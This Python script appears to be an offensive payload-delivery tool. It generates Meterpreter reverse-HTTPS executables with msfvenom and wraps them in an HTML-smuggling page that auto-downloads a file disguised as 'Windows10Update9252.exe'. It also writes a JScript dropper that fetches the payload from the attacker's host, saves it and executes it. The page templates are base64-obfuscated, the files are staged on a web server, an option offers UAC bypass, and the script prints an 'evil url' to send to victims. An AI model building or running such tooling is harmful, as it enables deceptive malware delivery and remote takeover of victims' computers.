import os
import base64
import argparse
from makejs import writejs
from makerunner import gen,runner

#current_dir = os.getcwd()

'''
def gen(lhost,lport,bitness,pformat):
    msf_payload = "windows/x64/meterpreter/reverse_https"
    if bitness == "32":
        msf_payload = "windows/meterpreter/reverse_https"
    cmd = "msfvenom -p "+msf_payload+" LHOST="+lhost+" LPORT="+lport+" EXITFUNC=thread -f "+pformat+" -o met"+bitness+"."+pformat+""
    os.system(cmd)
    #print (cmd)
    print ('[+] met generated: lhost %s, lport %s, bitness %s, format %s' % (lhost,lport,bitness,pformat))
    print ('[!] msfvenom: %s' % cmd)
    resourcefile(msf_payload,lhost,lport,bitness)
    pass
'''

def write(bitness,pformat,ptype,proxy,uacbypass,lhost):        
    msffilename = "met%s.%s" % (bitness,pformat)
    jsfilename = "js%s.js" % (bitness)
    
    runfilename = "run.html"
    with open(runfilename,'w') as f:
        if ptype == "html":
            m = open(msffilename,'rb')
            msf = m.read()
            msf_b64 = base64.b64encode(msf).decode()
            data = "\n\nvar data = \"%s\"\n\n" % msf_b64
            upper = "PGh0bWw+Cjxib2R5Pgo8c2NyaXB0PgoKZnVuY3Rpb24gYmFzZTY0VG9BcnJheUJ1ZmZlcihiYXNlNjQpIHsKdmFyIGJpbmFyeV9zdHJpbmcgPSB3aW5kb3cuYXRvYihiYXNlNjQpOwp2YXIgbGVuID0gYmluYXJ5X3N0cmluZy5sZW5ndGg7CnZhciBieXRlcyA9IG5ldyBVaW50OEFycmF5KCBsZW4gKTsKZm9yICh2YXIgaSA9IDA7IGkgPCBsZW47IGkrKykgeyBieXRlc1tpXSA9IGJpbmFyeV9zdHJpbmcuY2hhckNvZGVBdChpKTsgfQpyZXR1cm4gYnl0ZXMuYnVmZmVyOwp9"
            lower = "dmFyIGRfZGF0YSA9IGJhc2U2NFRvQXJyYXlCdWZmZXIoZGF0YSkKdmFyIGJsb2IgPSBuZXcgQmxvYihbZF9kYXRhXSwge3R5cGU6ICdvY3RldC9zdHJlYW0nfSk7Cgp2YXIgZmlsZU5hbWUgPSAiV2luZG93czEwVXBncmFkZTkyNTIuZXhlIgoKdmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdhJyk7CmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7CmEuc3R5bGUgPSAnZGlzcGxheTogbm9uZSc7CnZhciB1cmwgPSB3aW5kb3cuVVJMLmNyZWF0ZU9iamVjdFVSTChibG9iKTsKYS5ocmVmID0gdXJsOwphLmRvd25sb2FkID0gZmlsZU5hbWU7CgphLmNsaWNrKCk7CndpbmRvdy5VUkwucmV2b2tlT2JqZWN0VVJMKHVybCk7Cgo8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+"
            upper = base64.b64decode(upper).decode()
            f.write(upper)
            f.write(data)
            lower = base64.b64decode(lower).decode()
            f.write(lower)
        if ptype == "js":
            payfilename = "Windows10Update9252.%s" % pformat
            payfilepath = "/var/www/html/"
            copy(msffilename,payfilepath,payfilename)
            with open(jsfilename,'w') as j:
                j.write("var url = \"http://%s/%s\"\n" % (lhost,payfilename))
                j.write(base64.b64decode("dmFyIE9iamVjdCA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCdNU1hNTDIuWE1MSFRUUCcpOwoKT2JqZWN0Lk9wZW4oJ0dFVCcsdXJsLGZhbHNlKTsKT2JqZWN0LlNlbmQoKTsKCmlmIChPYmplY3QuU3RhdHVzID09IDIwMCkKewoJdmFyIFN0cmVhbSA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCdBRE9EQi5TdHJlYW0nKTsKCVN0cmVhbS5PcGVuKCk7CglTdHJlYW0uVHlwZSA9IDE7IC8vIGFkVHlwZUJpbmFyeQoJU3RyZWFtLldyaXRlKE9iamVjdC5SZXNwb25zZUJvZHkpOwoJU3RyZWFtLlBvc2l0aW9uID0gMDs=").decode())
                j.write("\n\tStream.SaveToFile(\"%s\", 2);\n" % payfilename)
                j.write(base64.b64decode("CVN0cmVhbS5DbG9zZSgpOwp9Cg==").decode())
                j.write("var r = new ActiveXObject(\"WScript.Shell\").Run(\"%s\");\n" % payfilename)
            j.close()
            j = open(jsfilename,'rb')
            jscript = j.read()
            jscript_b64 = base64.b64encode(jscript).decode()
            data = "\n\nvar data = \"%s\"\n\n" % jscript_b64
            upper = "PGh0bWw+Cjxib2R5Pgo8c2NyaXB0PgoKZnVuY3Rpb24gYmFzZTY0VG9BcnJheUJ1ZmZlcihiYXNlNjQpIHsKdmFyIGJpbmFyeV9zdHJpbmcgPSB3aW5kb3cuYXRvYihiYXNlNjQpOwp2YXIgbGVuID0gYmluYXJ5X3N0cmluZy5sZW5ndGg7CnZhciBieXRlcyA9IG5ldyBVaW50OEFycmF5KCBsZW4gKTsKZm9yICh2YXIgaSA9IDA7IGkgPCBsZW47IGkrKykgeyBieXRlc1tpXSA9IGJpbmFyeV9zdHJpbmcuY2hhckNvZGVBdChpKTsgfQpyZXR1cm4gYnl0ZXMuYnVmZmVyOwp9"
            lower = "CnZhciBkX2RhdGEgPSBiYXNlNjRUb0FycmF5QnVmZmVyKGRhdGEpCnZhciBibG9iID0gbmV3IEJsb2IoW2RfZGF0YV0sIHt0eXBlOiAnb2N0ZXQvc3RyZWFtJ30pOwoKdmFyIGZpbGVOYW1lID0gImRlbW8uanMiCgp2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2EnKTsKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTsKYS5zdHlsZSA9ICdkaXNwbGF5OiBub25lJzsKdmFyIHVybCA9IHdpbmRvdy5VUkwuY3JlYXRlT2JqZWN0VVJMKGJsb2IpOwphLmhyZWYgPSB1cmw7CmEuZG93bmxvYWQgPSBmaWxlTmFtZTsKCmEuY2xpY2soKTsKd2luZG93LlVSTC5yZXZva2VPYmplY3RVUkwodXJsKTsKCjwvc2NyaXB0Pgo8L2JvZHk+CjwvaHRtbD4="
            upper = base64.b64decode(upper).decode()
            f.write(upper)
            f.write(data)
            lower = base64.b64decode(lower).decode()
            f.write(lower)
            #print(jscript)
            pass
        if ptype == "dntjs":
            
            dntjsfilename = writejs(bitness,pformat,uacbypass,lhost)
            payfilepath = "/var/www/html/"
            copy(dntjsfilename,payfilepath,dntjsfilename)
            j = open(dntjsfilename,'rb')
            jscript = j.read()
            jscript_b64 = base64.b64encode(jscript).decode()
            data = "\n\nvar data = \"%s\"\n\n" % jscript_b64
            upper = "PGh0bWw+Cjxib2R5Pgo8c2NyaXB0PgoKZnVuY3Rpb24gYmFzZTY0VG9BcnJheUJ1ZmZlcihiYXNlNjQpIHsKdmFyIGJpbmFyeV9zdHJpbmcgPSB3aW5kb3cuYXRvYihiYXNlNjQpOwp2YXIgbGVuID0gYmluYXJ5X3N0cmluZy5sZW5ndGg7CnZhciBieXRlcyA9IG5ldyBVaW50OEFycmF5KCBsZW4gKTsKZm9yICh2YXIgaSA9IDA7IGkgPCBsZW47IGkrKykgeyBieXRlc1tpXSA9IGJpbmFyeV9zdHJpbmcuY2hhckNvZGVBdChpKTsgfQpyZXR1cm4gYnl0ZXMuYnVmZmVyOwp9"
            lower = "CnZhciBkX2RhdGEgPSBiYXNlNjRUb0FycmF5QnVmZmVyKGRhdGEpCnZhciBibG9iID0gbmV3IEJsb2IoW2RfZGF0YV0sIHt0eXBlOiAnb2N0ZXQvc3RyZWFtJ30pOwoKdmFyIGZpbGVOYW1lID0gImRlbW8uanMiCgp2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2EnKTsKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTsKYS5zdHlsZSA9ICdkaXNwbGF5OiBub25lJzsKdmFyIHVybCA9IHdpbmRvdy5VUkwuY3JlYXRlT2JqZWN0VVJMKGJsb2IpOwphLmhyZWYgPSB1cmw7CmEuZG93bmxvYWQgPSBmaWxlTmFtZTsKCmEuY2xpY2soKTsKd2luZG93LlVSTC5yZXZva2VPYmplY3RVUkwodXJsKTsKCjwvc2NyaXB0Pgo8L2JvZHk+CjwvaHRtbD4="
            upper = base64.b64decode(upper).decode()
            f.write(upper)
            f.write(data)
            lower = base64.b64decode(lower).decode()
            f.write(lower)

    f.close()
    print ('[+] %s written' % runfilename)
    return runfilename
    pass

def copy(runfilename,payfilepath,payfilename):
    os.system("cp %s %s%s" % (runfilename,payfilepath,payfilename))
    print ('[+] %s copied to %s%s' % (runfilename,payfilepath,payfilename))
    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--type','-t',required=True,dest='ptype',help='dntjs, js, or html')
    parser.add_argument('--proxy','-s',required=False,dest='proxy',help='proxy address, e.g. 192.168.135.1:3128')
    parser.add_argument('--uac','-u',required=False,dest='uacbypass',help='uacbypass 0 or 1')
    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host
    lport = args.port
    ptype = args.ptype
    proxy = args.proxy

    uacbypass = args.uacbypass
    if uacbypass != "1":
        uacbypass = "0"

    pformat = "exe"
    if ptype == "dntjs":
        pformat = "raw"
    if uacbypass == "0":
        gen(lhost,lport,bitness,pformat)
    if uacbypass == "1":
        runner(lhost,lport,bitness)
    runfilename = write(bitness,pformat,ptype,proxy,uacbypass,lhost)
    payfilepath = "/var/www/html/"
    copy(runfilename,payfilepath,runfilename)
    print ('[+] evil url: http://'+lhost+'/'+runfilename+'')
